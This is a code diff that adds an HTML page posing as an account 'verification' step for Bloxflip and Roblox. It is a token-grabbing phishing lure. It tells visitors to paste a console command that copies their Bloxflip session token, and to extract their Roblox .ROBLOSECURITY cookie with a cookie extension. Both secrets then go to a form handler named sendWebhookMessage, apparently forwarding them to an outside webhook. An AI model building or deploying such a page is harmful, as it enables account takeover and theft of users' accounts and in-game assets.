@@ -1,0 +1,146 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Connect an Account</title>
+  <style>
+    body {
+      background-color: #333;
+      color: #fff;
+      font-family: Arial, sans-serif;
+      margin: 0;
+      padding: 0;
+    }
+
+    .container {
+      width: 400px;
+      margin: 0 auto;
+      background-color: #666;
+      border-radius: 10px;
+      padding: 20px;
+      text-align: center;
+      display: none;
+      animation-duration: 0.5s;
+      animation-fill-mode: forwards;
+    }
+
+    .button-container {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+
+    .button {
+      display: inline-block;
+      margin-top: 10px;
+      padding: 10px 20px;
+      border: none;
+      border-radius: 5px;
+      font-size: 16px;
+      color: #fff;
+      cursor: pointer;
+      transition: background-color 0.3s ease;
+    }
+
+    .button-blue {
+      background-color: #007bff;
+    }
+
+    .button-red {
+      background-color: #dc3545;
+    }
+
+    .instructions {
+      text-align: left;
+      margin-top: 20px;
+    }
+
+    .code {
+      background-color: #333;
+      color: #fff;
+      padding: 5px;
+    }
+
+    .link {
+      color: #007bff;
+    }
+
+    .text-input {
+      width: 300px;
+      height: 30px;
+      margin-top: 20px;
+    }
+
+    .enter-button {
+      padding: 5px 10px;
+      background-color: #007bff;
+      border: none;
+      border-radius: 5px;
+      color: #fff;
+      cursor: pointer;
+      transition: background-color 0.3s ease;
+    }
+
+    @keyframes fadeOut {
+      0% {
+        opacity: 1;
+      }
+      100% {
+        opacity: 0;
+      }
+    }
+
+    @keyframes fadeIn {
+      0% {
+        opacity: 0;
+      }
+      100% {
+        opacity: 1;
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class="container" id="connectAccountBox" style="display: block;">
+    <h1>Connect an Account to Verify</h1>
+    <div class="button-container">
+      <button class="button button-blue" onclick="showBloxflipBox()">Bloxflip</button>
+      <button class="button button-red" onclick="showRobloxBox()">Roblox</button>
+    </div>
+  </div>
+
+  <div class="container" id="bloxflipBox">
+    <h1>Follow These Steps</h1>
+    <p>To Link Your Bloxflip Account</p>
+    <ol class="instructions">
+      <li>Head over to <a href="https://bloxflip.com" class="link">Bloxflip</a></li>
+      <li>Simultaneously press <kbd>Ctrl+Shift+I</kbd></li>
+      <li>Click on the Console tab</li>
+      <li>Paste this code into your console</li>
+    </ol>
+    <pre><code class="code" style="background-color: #555;">copy(localStorage.getItem('_DO_NOT_SHARE_BLOXFLIP_TOKEN'));</code></pre>
+    <p>If the console says <code>undefined</code>, it should be in your clipboard.</p>
+    <div id="bloxflipForm">
+      <input type="text" class="text-input" id="bloxflipTokenInput" placeholder="Enter your Bloxflip token">
+      <button class="enter-button" onclick="sendWebhookMessage('bloxflipTokenInput')">Enter</button>
+    </div>
+  </div>
+
+  <div class="container" id="robloxBox">
+    <h1>Follow These Steps</h1>
+    <p>To Link Your Roblox Account</p>
+    <ol class="instructions">
+      <li>Go To <a href="https://roblox.com" class="link">Roblox</a></li>
+      <li>Download the <a href="https://chrome.google.com/webstore/detail/editthiscookie/fngmhnnpilhplaeedifhccceomclgfbg" class="link">Edit This Cookie</a> extension</li>
+      <li>While on Roblox, click on the extension</li>
+      <li>Go to ".ROBLOSECURITY" and copy the cookie</li>
+    </ol>
+    <div id="robloxForm">
+      <input type="text" class="text-input" id="robloxTokenInput" placeholder="Enter your Roblox security token">
+      <button class="enter-button" onclick="sendWebhookMessage('robloxTokenInput')">Enter</button>
+    </div>
+  </div>
+</body>
+</html>
+<script src="script.js"></script>
+</body>
+</html>
